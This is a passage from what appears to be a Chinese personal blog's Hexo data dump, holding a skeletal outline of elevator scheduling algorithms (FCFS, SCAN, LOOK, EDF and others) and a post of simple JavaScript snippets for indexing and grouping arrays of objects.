class=\"headerlink\" title=\"—传统电梯调度算法—\"></a>—传统电梯调度算法—</h2><h3 id=\"1-1-先来先服务算法（FCFS）\"><a href=\"#1-1-先来先服务算法（FCFS）\" class=\"headerlink\" title=\"1.1 先来先服务算法（FCFS）\"></a>1.1 先来先服务算法（FCFS）</h3><p>  先来先服务（FCFS-First Come First Serve）算法</p>\n<h3 id=\"1-2-最短寻找楼层时间优先算法（SSTF）\"><a href=\"#1-2-最短寻找楼层时间优先算法（SSTF）\" class=\"headerlink\" title=\"1.2 最短寻找楼层时间优先算法（SSTF）\"></a>1.2 最短寻找楼层时间优先算法（SSTF）</h3><h3 id=\"1-3-扫描算法（SCAN）\"><a href=\"#1-3-扫描算法（SCAN）\" class=\"headerlink\" title=\"1.3 扫描算法（SCAN）\"></a>1.3 扫描算法（SCAN）</h3><h3 id=\"1-4-LOOK-算法\"><a href=\"#1-4-LOOK-算法\" class=\"headerlink\" title=\"1.4 LOOK 算法\"></a>1.4 LOOK 算法</h3><h3 id=\"1-5-SATF-算法\"><a href=\"#1-5-SATF-算法\" class=\"headerlink\" title=\"1.5 SATF 算法\"></a>1.5 SATF 算法</h3><h2 id=\"—实时电梯调度算法—\"><a href=\"#—实时电梯调度算法—\" class=\"headerlink\" title=\"—实时电梯调度算法—\"></a>—实时电梯调度算法—</h2><h3 id=\"2-1-最早截止期优先调度算法\"><a href=\"#2-1-最早截止期优先调度算法\" class=\"headerlink\" title=\"2.1 最早截止期优先调度算法\"></a>2.1 最早截止期优先调度算法</h3><h3 id=\"2-2-SCAN-EDF-算法\"><a href=\"#2-2-SCAN-EDF-算法\" class=\"headerlink\" title=\"2.2 SCAN-EDF 算法\"></a>2.2 SCAN-EDF 算法</h3><h3 id=\"2-3-PI-算法\"><a href=\"#2-3-PI-算法\" class=\"headerlink\" title=\"2.3 PI 算法\"></a>2.3 PI 算法</h3><h3 id=\"2-4-FD-SCAN-算法\"><a href=\"#2-4-FD-SCAN-算法\" class=\"headerlink\" title=\"2.4 FD-SCAN 算法\"></a>2.4 FD-SCAN 算法</h3><h2 id=\"—电梯调度高水平研究—\"><a href=\"#—电梯调度高水平研究—\" class=\"headerlink\" title=\"—电梯调度高水平研究—\"></a>—电梯调度高水平研究—</h2><p>以上两节介绍了几种简单的电梯调度算法。</p>\n<p>但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯<code>群控</code>的时代。</p>\n<p>随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。</p>\n<p>由此，电梯的<code>群控</code>方面陆续发展出了一批新方法，包括：<br>基于<code>专家系统</code>的电梯群控方法、<br>基于<code>模糊逻辑</code>的电梯群控方法、<br>基于<code>遗产算法</code>的电梯群控方法、<br>基于<code>神经网络</code>的电梯群控方法、<br>基于<code>模糊神经网络</code>的电梯群控方法。</p>\n<h2 id=\"—电梯问题的需求分析—\"><a href=\"#—电梯问题的需求分析—\" class=\"headerlink\" title=\"—电梯问题的需求分析—\"></a>—电梯问题的需求分析—</h2><h3 id=\"4-1-电梯的初始状态\"><a href=\"#4-1-电梯的初始状态\" class=\"headerlink\" title=\"4.1 电梯的初始状态\"></a>4.1 电梯的初始状态</h3><h3 id=\"4-2-电梯基本功能\"><a href=\"#4-2-电梯基本功能\" class=\"headerlink\" title=\"4.2 电梯基本功能\"></a>4.2 电梯基本功能</h3><h3 id=\"4-3-电梯按钮功能\"><a href=\"#4-3-电梯按钮功能\" class=\"headerlink\" title=\"4.3 电梯按钮功能\"></a>4.3 电梯按钮功能</h3><h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。</p>\n<p>但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">查看原文</a></p>\n<p>另：<br><a href=\"https://www.zhihu.com/question/24964987\" target=\"_blank\" rel=\"noopener\">【知名互联网公司面试中常见的算法题】</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"电梯调度算法\"><a href=\"#电梯调度算法\" class=\"headerlink\" title=\"电梯调度算法\"></a><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">电梯调度算法</a></h1><h2 id=\"—传统电梯调度算法—\"><a href=\"#—传统电梯调度算法—\" class=\"headerlink\" title=\"—传统电梯调度算法—\"></a>—传统电梯调度算法—</h2><h3 id=\"1-1-先来先服务算法（FCFS）\"><a href=\"#1-1-先来先服务算法（FCFS）\" class=\"headerlink\" title=\"1.1 先来先服务算法（FCFS）\"></a>1.1 先来先服务算法（FCFS）</h3><p>  先来先服务（FCFS-First Come First Serve）算法</p>\n<h3 id=\"1-2-最短寻找楼层时间优先算法（SSTF）\"><a href=\"#1-2-最短寻找楼层时间优先算法（SSTF）\" class=\"headerlink\" title=\"1.2 最短寻找楼层时间优先算法（SSTF）\"></a>1.2 最短寻找楼层时间优先算法（SSTF）</h3><h3 id=\"1-3-扫描算法（SCAN）\"><a href=\"#1-3-扫描算法（SCAN）\" class=\"headerlink\" title=\"1.3 扫描算法（SCAN）\"></a>1.3 扫描算法（SCAN）</h3><h3 id=\"1-4-LOOK-算法\"><a href=\"#1-4-LOOK-算法\" class=\"headerlink\" title=\"1.4 LOOK 算法\"></a>1.4 LOOK 算法</h3><h3 id=\"1-5-SATF-算法\"><a href=\"#1-5-SATF-算法\" class=\"headerlink\" title=\"1.5 SATF 算法\"></a>1.5 SATF 算法</h3><h2 id=\"—实时电梯调度算法—\"><a href=\"#—实时电梯调度算法—\" class=\"headerlink\" title=\"—实时电梯调度算法—\"></a>—实时电梯调度算法—</h2><h3 id=\"2-1-最早截止期优先调度算法\"><a href=\"#2-1-最早截止期优先调度算法\" class=\"headerlink\" title=\"2.1 最早截止期优先调度算法\"></a>2.1 最早截止期优先调度算法</h3><h3 id=\"2-2-SCAN-EDF-算法\"><a href=\"#2-2-SCAN-EDF-算法\" class=\"headerlink\" title=\"2.2 SCAN-EDF 算法\"></a>2.2 SCAN-EDF 算法</h3><h3 id=\"2-3-PI-算法\"><a href=\"#2-3-PI-算法\" class=\"headerlink\" title=\"2.3 PI 算法\"></a>2.3 PI 算法</h3><h3 id=\"2-4-FD-SCAN-算法\"><a href=\"#2-4-FD-SCAN-算法\" class=\"headerlink\" title=\"2.4 FD-SCAN 算法\"></a>2.4 FD-SCAN 算法</h3><h2 id=\"—电梯调度高水平研究—\"><a href=\"#—电梯调度高水平研究—\" class=\"headerlink\" title=\"—电梯调度高水平研究—\"></a>—电梯调度高水平研究—</h2><p>以上两节介绍了几种简单的电梯调度算法。</p>\n<p>但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯<code>群控</code>的时代。</p>\n<p>随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。</p>\n<p>由此，电梯的<code>群控</code>方面陆续发展出了一批新方法，包括：<br>基于<code>专家系统</code>的电梯群控方法、<br>基于<code>模糊逻辑</code>的电梯群控方法、<br>基于<code>遗产算法</code>的电梯群控方法、<br>基于<code>神经网络</code>的电梯群控方法、<br>基于<code>模糊神经网络</code>的电梯群控方法。</p>\n<h2 id=\"—电梯问题的需求分析—\"><a href=\"#—电梯问题的需求分析—\" class=\"headerlink\" title=\"—电梯问题的需求分析—\"></a>—电梯问题的需求分析—</h2><h3 id=\"4-1-电梯的初始状态\"><a href=\"#4-1-电梯的初始状态\" class=\"headerlink\" title=\"4.1 电梯的初始状态\"></a>4.1 电梯的初始状态</h3><h3 id=\"4-2-电梯基本功能\"><a href=\"#4-2-电梯基本功能\" class=\"headerlink\" title=\"4.2 电梯基本功能\"></a>4.2 电梯基本功能</h3><h3 id=\"4-3-电梯按钮功能\"><a href=\"#4-3-电梯按钮功能\" class=\"headerlink\" title=\"4.3 电梯按钮功能\"></a>4.3 电梯按钮功能</h3><h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。</p>\n<p>但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">查看原文</a></p>\n<p>另：<br><a href=\"https://www.zhihu.com/question/24964987\" target=\"_blank\" rel=\"noopener\">【知名互联网公司面试中常见的算法题】</a></p>\n"},{"title":"遍历数组对象","date":"2018-07-27T09:43:22.000Z","_content":"## 遍历数组对象\n\n````\n/** 参数说明\n * arr: array = 被遍历 数组proto\n * objKey: string = filter\n * key: string = 当前筛选项\n */\ngetIndex = function (arr, objKey, key) {\n  for (let i = 0; i < arr.length; i++) {\n    if (arr[i][objKey] === key) {\n      return i;\n    }\n  }\n  return -1;\n}\n````\n\n````\nfor (const item of callback.data.items) {\n\n\n  let inArr = getIndex(this.imgsCascade, \"value\", item.imgMode)\n\n  let thisObj = array[inArr]\n\n  if (inArr > -1) {\n    thisObj.children ?\n      thisObj.children.push(children) :\n      thisObj.children = [children];\n  } else {\n    array.push(\n      {\n        value: item.imgMode,\n        label: item.imgItem,\n        children: [{xxx:xxx, yyy:yyy}]\n      }\n    )\n  }\n}\n````\n\n````\n{\nfunction getIndex(arr, key) {\n        for (let i = 0; i < arr.length; i++) {\n                if (arr[i].key === key) {\n                        return i;\n                }\n        }\n        return -1;\n}\n\nfunction getKey(obj) {\n        return obj.key;\n}\n\nvar arr = [\n  {\n    key: '1'\n  }, \n  {\n    key: '2'\n  }, \n  {\n    key: '3'\n  }\n]\nvar a = {\n        key: '1'\n}\nvar c = {\n        key: '1'\n}\nvar b = {\n        key: '4'\n}\n\nfunction pushToArr(val) {\n        if (getIndex(arr, getKey(val)) > -1) {\n                if (arr[getIndex(arr, getKey(val))].children) {\n                        arr[getIndex(arr, getKey(val))].children.push(val)\n                } else {\n                        arr[getIndex(arr, getKey(val))].children = [val]\n                }\n        } else {\n                arr.push(val)\n        }\n}\npushToArr(a)\nconsole.log(arr);\npushToArr(c)\nconsole.log(arr);\n}\n````\n\n---\n````\n{\n        function hasKey(arr, key) {\n\n                var ret = false;\n\n                for (let i = 0; i < arr.length; i++) {\n                        if (arr[i].key === key) {\n                                ret = true;\n                                break;\n                        }\n                }\n                return ret;\n        }\n\n        function getKey(obj) {\n                return obj.key;\n        }\n\n        var arr = [{\n                        key: '1',\n                        children: [\n\n                        ]\n                },\n                {\n                        key: '2',\n                        children: [\n\n                        ]\n                },\n                {\n                        key: '3',\n                        children: [\n\n                        ]\n                }\n        ]\n\n        var a = {\n                key: '1'\n        }\n\n        var b = {\n                key: '4'\n        }\n        console.log(hasKey(arr, getKey(a)));\n        console.log(hasKey(arr, getKey(b)));\n}\n\n{\n        function getIndex(arr, objKey, key) {\n                for (let i = 0; i < arr.length; i++) {\n                        if (arr[i].key === key) {\n                                return i;\n                        }\n                }\n                return -1;\n        }\n\n        function getKey(obj) {\n                return obj.key;\n        }\n        var arr = [{\n                key: '1'\n        }, {\n                key: '2'\n        }, {\n                key: '3'\n        }]\n        var a = {\n                key: '1'\n        }\n        var b = {\n                key: '4'\n        }\n\n        function pushToArr(val) {\n                if (getIndex(arr, getKey(val)) > -1) {\n                        arr[getIndex(arr, getKey(val))].children = [val]\n                } else {\n                        arr.push(val)\n                }\n        }\n        pushToArr(b)\n        console.log(arr);\n}\n\n{\n        function getIndex(arr, key) {\n                for (let i = 0; i < arr.length; i++) {\n                        if (arr[i].key === key) {\n                                return i;\n                        }\n                }\n                return -1;\n        }\n\n        function getKey(obj) {\n                return obj.key;\n        }\n\n        var arr = [{\n                key: '1'\n        }, {\n                key: '2'\n        }, {\n                key: '3'\n        }]\n        var a = {\n                key: '1'\n        }\n        var c = {\n                key: '1'\n        }\n        var b = {\n                key: '4'\n        }\n\n        function pushToArr(val) {\n                if (getIndex(arr, getKey(val)) > -1) {\n                        if (arr[getIndex(arr, getKey(val))].children) {\n                                arr[getIndex(arr, getKey(val))].children.push(val)\n                        } else {\n                                arr[getIndex(arr, getKey(val))].children = [val]\n                        }\n                } else {\n                        arr.push(val)\n                }\n        }\n        pushToArr(a)\n        console.log(arr);\n        pushToArr(c)\n        console.log(arr);\n}\n````","source":"_posts/Algorithm/遍历数组对象.md","raw":"---\ntitle: 遍历数组对象\ndate: 2018-07-27 17:43:22\ntags: 遍历数组对象\ncategories: Algorithm\n---\n## 遍历数组对象\n\n````\n/** 参数说明\n * arr: array = 被遍历 数组proto\n * objKey: string = filter\n * key: string = 当前筛选项\n */\ngetIndex = function (arr, objKey, key) {\n  for (let i = 0; i < arr.length; i++) {\n    if (arr[i][objKey] === key) {\n      return i;\n    }\n  }\n  return -1;\n}\n````\n\n````\nfor (const item of callback.data.items) {\n\n\n  let inArr = getIndex(this.imgsCascade, \"value\", item.imgMode)\n\n  let thisObj = array[inArr]\n\n  if (inArr > -1) {\n    thisObj.children ?\n      thisObj.children.push(children) :\n      thisObj.children = [children];\n  } else {\n    array.push(\n      {\n        value: item.imgMode,\n        label: item.imgItem,\n        children: [{xxx:xxx, yyy:yyy}]\n      }\n    )\n  }\n}\n````\n\n````\n{\nfunction getIndex(arr, key) {\n        for (let i = 0; i < arr.length; i++) {\n                if (arr[i].key === key) {\n                        return i;\n                }\n        }\n        return -1;\n}\n\nfunction getKey(obj) {\n        return obj.key;\n}\n\nvar arr = [\n  {\n    key: '1'\n  }, \n  {\n    key: '2'\n  }, \n  {\n    key: '3'\n  }\n]\nvar a = {\n        key: '1'\n}\nvar c = {\n        key: '1'\n}\nvar b = {\n        key: '4'\n}\n\nfunction pushToArr(val) {\n        if (getIndex(arr, getKey(val)) > -1) {\n                if (arr[getIndex(arr, getKey(val))].children) {\n                        arr[getIndex(arr, getKey(val))].children.push(val)\n                } else {\n                        arr[getIndex(arr, getKey(val))].children = [val]\n                }\n        } else {\n                arr.push(val)\n        }\n}\npushToArr(a)\nconsole.log(arr);\npushToArr(c)\nconsole.log(arr);\n}\n````\n\n---\n````\n{\n        function hasKey(arr, key) {\n\n                var ret = false;\n\n                for (let i = 0; i < arr.length; i++) {\n                        if (arr[i].key === key) {\n                                ret = true;\n                                break;\n                        }\n                }\n                return ret;\n        }\n\n        function getKey(obj) {\n                return obj.key;\n        }\n\n        var arr = [{\n                        key: '1',\n                        children: [\n\n                        ]\n                },\n                {\n                        key: '2',\n                        children: [\n\n                        ]\n                },\n                {\n                        key: '3',\n                        children: [\n\n                        ]\n                }\n        ]\n\n        var a = {\n                key: '1'\n        }\n\n        var b = {\n                key: '4'\n        }\n        console.log(hasKey(arr, getKey(a)));\n        console.log(hasKey(arr, getKey(b)));\n}\n\n{\n        function getIndex(arr, objKey, key) {\n                for (let i = 0; i < arr.length; i++) {\n                        if (arr[i].key === key) {\n                                return i;\n                        }\n                }\n                return -1;\n        }\n\n        function getKey(obj) {\n                return obj.key;\n        }\n        var arr = [{\n                key: '1'\n        }, {\n                key: '2'\n        }, {\n                key: '3'\n        }]\n        var a = {\n                key: '1'\n        }\n        var b = {\n                key: '4'\n        }\n\n        function pushToArr(val) {\n                if (getIndex(arr, getKey(val)) > -1) {\n                        arr[getIndex(arr, getKey(val))].children = [val]\n                } else {\n                        arr.push(val)\n                }\n        }\n        pushToArr(b)\n        console.log(arr);\n}\n\n{\n        function getIndex(arr, key) {\n                for (let i = 0; i < arr.length; i++) {\n                        if (arr[i].key === key) {\n                                return i;\n                        }\n                }\n                return -1;\n        }\n\n        function getKey(obj) {\n                return obj.key;\n        }\n\n        var arr = [{\n                key: '1'\n        }, {\n                key: '2'\n        }, {\n                key: '3'\n        }]\n        var a = {\n                key: '1'\n        }\n        var c = {\n                key: '1'\n        }\n        var b = {\n                key: '4'\n        }\n\n        function pushToArr(val) {\n                if (getIndex(arr, getKey(val)) > -1) {\n                        if (arr[getIndex(arr, getKey(val))].children) {\n                                arr[getIndex(arr, getKey(val))].children.push(val)\n                        } else {\n                                arr[getIndex(arr, getKey(val))].children = [val]\n                        }\n                } else {\n                        arr.push(val)\n                }\n        }\n        pushToArr(a)\n        console.log(arr);\n        pushToArr(c)\n        console.log(arr);\n}\n````","slug":"Algorithm/遍历数组对象","published":1,"updated":"2018-09-05T06:33:18.441Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxum002izodv8vl9wpkh","content":"<h2 id=\"遍历数组对象\"><a href=\"#遍历数组对象\" class=\"headerlink\" title=\"遍历数组对象\"></a>遍历数组对象</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 参数说明</span><br><span class=\"line\"> * arr: array = 被遍历 数组proto</span><br><span class=\"line\"> * objKey: string = filter</span><br><span class=\"line\"> * key: string = 当前筛选项</span><br><span class=\"line\"> */</span><br><span class=\"line\">getIndex = function (arr, objKey, key) &#123;</span><br><span class=\"line\">  for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">    if (arr[i][objKey] === key) &#123;</span><br><span class=\"line\">      return i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return -1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for (const item of callback.data.items) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  let inArr = getIndex(this.imgsCascade, &quot;value&quot;, item.imgMode)</span><br><span class=\"line\"></span><br><span class=\"line\">  let thisObj = array[inArr]</span><br><span class=\"line\"></span><br><span class=\"line\">  if (inArr &gt; -1) &#123;</span><br><span class=\"line\">    thisObj.children ?</span><br><span class=\"line\">      thisObj.children.push(children) :</span><br><span class=\"line\">      thisObj.children = [children];</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    array.push(</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        value: item.imgMode,</span><br><span class=\"line\">        label: item.imgItem,</span><br><span class=\"line\">        children: [&#123;xxx:xxx, yyy:yyy&#125;]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">function getIndex(arr, key) &#123;</span><br><span class=\"line\">        for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">                if (arr[i].key === key) &#123;</span><br><span class=\"line\">                        return i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return -1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function getKey(obj) &#123;</span><br><span class=\"line\">        return obj.key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var arr = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    key: &apos;1&apos;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    key: &apos;2&apos;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    key: &apos;3&apos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">var a = &#123;</span><br><span class=\"line\">        key: &apos;1&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var c = &#123;</span><br><span class=\"line\">        key: &apos;1&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var b = &#123;</span><br><span class=\"line\">        key: &apos;4&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function pushToArr(val) &#123;</span><br><span class=\"line\">        if (getIndex(arr, getKey(val)) &gt; -1) &#123;</span><br><span class=\"line\">                if (arr[getIndex(arr, getKey(val))].children) &#123;</span><br><span class=\"line\">                        arr[getIndex(arr, getKey(val))].children.push(val)</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                        arr[getIndex(arr, getKey(val))].children = [val]</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">                arr.push(val)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pushToArr(a)</span><br><span class=\"line\">console.log(arr);</span><br><span class=\"line\">pushToArr(c)</span><br><span class=\"line\">console.log(arr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<hr>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">        function hasKey(arr, key) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                var ret = false;</span><br><span class=\"line\"></span><br><span class=\"line\">                for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">                        if (arr[i].key === key) &#123;</span><br><span class=\"line\">                                ret = true;</span><br><span class=\"line\">                                break;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                return ret;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function getKey(obj) &#123;</span><br><span class=\"line\">                return obj.key;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        var arr = [&#123;</span><br><span class=\"line\">                        key: &apos;1&apos;,</span><br><span class=\"line\">                        children: [</span><br><span class=\"line\"></span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        key: &apos;2&apos;,</span><br><span class=\"line\">                        children: [</span><br><span class=\"line\"></span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        key: &apos;3&apos;,</span><br><span class=\"line\">                        children: [</span><br><span class=\"line\"></span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        var a = &#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        var b = &#123;</span><br><span class=\"line\">                key: &apos;4&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(hasKey(arr, getKey(a)));</span><br><span 